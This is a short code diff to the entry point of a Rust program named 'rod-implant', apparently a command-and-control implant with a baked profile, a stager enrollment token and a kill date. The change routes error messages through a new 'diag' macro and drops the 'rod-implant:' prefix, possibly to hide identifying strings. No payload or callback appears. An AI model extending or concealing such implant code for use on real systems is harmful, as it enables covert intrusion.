@@ -1,5 +1,6 @@
 mod baked;
 mod channel;
+mod diag;
 mod enroll;
 mod envelope;
 mod error;
@@ -25,17 +26,17 @@ fn main() {
     let Some(profile) =
         profile::Profile::from_baked(baked::PROFILE).or_else(profile::Profile::from_env)
     else {
-        eprintln!(
-            "rod-implant: this build carries no baked profile and no ROD_* environment; nothing to run"
+        crate::diag!(
+            "this build carries no baked profile and no ROD_* environment; nothing to run"
         );
         std::process::exit(2);
     };
     if profile.token.is_empty() {
-        eprintln!("rod-implant: no enrollment credential (bake or ROD_STAGER_TOKEN)");
+        crate::diag!("no enrollment credential (bake or ROD_STAGER_TOKEN)");
         std::process::exit(2);
     }
     if profile.kill_date_passed() {
-        eprintln!("rod-implant: kill date has passed; refusing to run");
+        crate::diag!("kill date has passed; refusing to run");
         std::process::exit(1);
     }
     std::process::exit(match run::run(&profile) {
